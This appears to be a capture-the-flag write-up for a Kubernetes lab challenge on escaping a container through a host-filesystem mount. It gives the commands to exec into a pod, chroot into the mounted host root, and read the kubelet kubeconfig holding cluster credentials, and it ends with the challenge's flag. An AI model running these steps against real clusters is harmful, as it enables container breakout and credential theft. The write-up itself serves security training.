## Challenge 20 - Escaping the container and accessing host fs.

**Challenge Type:** Breaker

Lets apply our deployment

```json
kubectl apply -f challenge20/deployment_host_fs.yaml
```

Enter the container

[The most pointess Kubernetes command ever](https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/)

```json
// get pods
kubectl get pods

// enter a pod
kubectl exec -it [pod_name] -- bash

//list the file system
root@challenge11-b6c789695-mgqkg:/# ls
bin  boot  dev  etc  home  k8-host  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

![[Pasted image 20220309224654.png]]

```json
// lets cd into the /k8-host directory
cd /k8-host

// then lets run chroot to change the root directory and get host privileges
chroot . bash
```

we can now pull the certificates for the cluster.

```json
cat /var/lib/kubelet/kubeconfig
```

![[Pasted image 20220309224800.png]]

```json
ls
cat flag
```

![[Pasted image 20220309224818.png]]

> 🏁 Challenge 20 Flag - `k8_ctf{esc4pIN9coNT41NeR5}`


Exit

```json
exit
```

cleanup

```json
kubectl delete -f challenege20/deployment_host_fs.yaml
```